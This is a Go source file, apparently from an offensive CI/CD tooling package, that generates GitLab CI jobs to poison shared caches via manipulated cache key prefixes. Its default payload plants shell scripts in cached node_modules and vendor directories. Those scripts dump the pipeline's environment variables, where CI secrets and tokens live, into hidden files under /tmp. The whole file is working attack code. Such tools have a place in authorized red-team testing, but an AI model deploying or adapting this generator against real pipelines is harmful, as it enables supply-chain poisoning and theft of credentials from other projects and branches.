package payloads

import (
	"fmt"
	"strings"
)

// CacheKeyPoisonOptions configures a cache key prefix injection payload.
type CacheKeyPoisonOptions struct {
	Common     CommonOptions
	KeyPrefix  string   // attacker-controlled prefix (default: shared cache prefix)
	KeyFiles   []string // files for cache:key:files (content-based key)
	CachePaths []string // paths to cache (default: [".cache"])
	PoisonCmd  string   // command to modify cached content
	Policy     string   // push|pull-push (default: "push")
}

// GenerateCacheKeyPoisonYAML generates a CI job that poisons shared caches
// via cache:key:prefix and cache:key:files manipulation.
func GenerateCacheKeyPoisonYAML(o CacheKeyPoisonOptions) string {
	name, stage := o.Common.defaults("cache-key-poison")

	if o.KeyPrefix == "" {
		o.KeyPrefix = "$CI_DEFAULT_BRANCH"
	}
	if len(o.CachePaths) == 0 {
		o.CachePaths = []string{".cache", "node_modules", "vendor"}
	}
	if o.Policy == "" {
		o.Policy = "push"
	}
	if strings.TrimSpace(o.PoisonCmd) == "" {
		o.PoisonCmd = buildDefaultPoisonScript()
	}

	cacheBlock := buildCacheBlock(o)

	return fmt.Sprintf(`stages: [%s]

%s:
  stage: %s%s%s
  cache:
%s
  script:
    - |
%s
  allow_failure: true%s
`, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		indentBlock(strings.TrimSpace(cacheBlock), 4),
		indentBlock(strings.TrimSpace(o.PoisonCmd), 6),
		rulesManual(o.Common.Manual))
}

func buildCacheBlock(o CacheKeyPoisonOptions) string {
	var b strings.Builder

	if len(o.KeyFiles) > 0 {
		b.WriteString("key:\n")
		fmt.Fprintf(&b, "  prefix: \"%s\"\n", o.KeyPrefix)
		b.WriteString("  files:\n")
		for _, f := range o.KeyFiles {
			fmt.Fprintf(&b, "    - %s\n", f)
		}
	} else {
		fmt.Fprintf(&b, "key: \"%s\"\n", o.KeyPrefix)
	}

	b.WriteString("paths:\n")
	for _, p := range o.CachePaths {
		fmt.Fprintf(&b, "  - %s\n", p)
	}
	fmt.Fprintf(&b, "policy: %s", o.Policy)

	return b.String()
}

func buildDefaultPoisonScript() string {
	return `_POISON() {
  mkdir -p .cache node_modules vendor || true

  # Inject malicious postinstall hook into cached node_modules
  if [ -d node_modules ]; then
    mkdir -p node_modules/.hooks
    cat > node_modules/.hooks/postinstall.sh << 'PAYLOAD'
#!/bin/sh
printenv | sort > /tmp/.cache_exfil.txt 2>/dev/null || true
PAYLOAD
    chmod +x node_modules/.hooks/postinstall.sh || true
  fi

  # Inject malicious script into cached vendor directory
  if [ -d vendor ]; then
    cat > vendor/.autoload_poison.sh << 'PAYLOAD'
#!/bin/sh
cat /proc/self/environ 2>/dev/null | tr '\0' '\n' > /tmp/.vendor_exfil.txt || true
PAYLOAD
    chmod +x vendor/.autoload_poison.sh || true
  fi

  echo "Cache populated with poisoned content"
}
_POISON || true`
}
